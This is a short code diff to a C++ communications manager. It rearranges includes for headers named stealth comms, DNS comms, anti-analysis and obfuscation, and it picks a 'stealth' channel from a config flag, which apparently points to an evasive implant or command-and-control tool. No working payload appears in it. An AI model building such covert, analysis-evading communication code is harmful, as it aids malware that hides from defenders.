@@ -6,10 +6,10 @@
 #include "communication/FtpComms.h" 
 #include "communication/DnsComms.h"
 #include "security/StealthComms.h"
+#include "security/AntiAnalysis.h"
+#include "security/Obfuscation.h"
 #include "core/Logger.h"
 #include "core/Configuration.h"
-#include "security/Obfuscation.h"
-#include "security/Encryption.h"
 #include "utils/NetworkUtils.h"
 #include "utils/DataUtils.h"
 #include "utils/SystemUtils.h"
@@ -20,6 +20,8 @@
 #include <cstdint>
 #include <string>
 #include <utility>
+
+#include "Encryption.h"
 
 // Fix: Remove constexpr and use regular string literal or static const
 static const std::string OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");
@@ -56,7 +58,7 @@ void CommsManager::InitializeCommsMethods() {
 }
 bool CommsManager::Initialize() {
     std::string method;
-    
+
     // Use stealth communication if enabled
     if (m_config->GetStealthEnabled()) {
         method = "stealth";
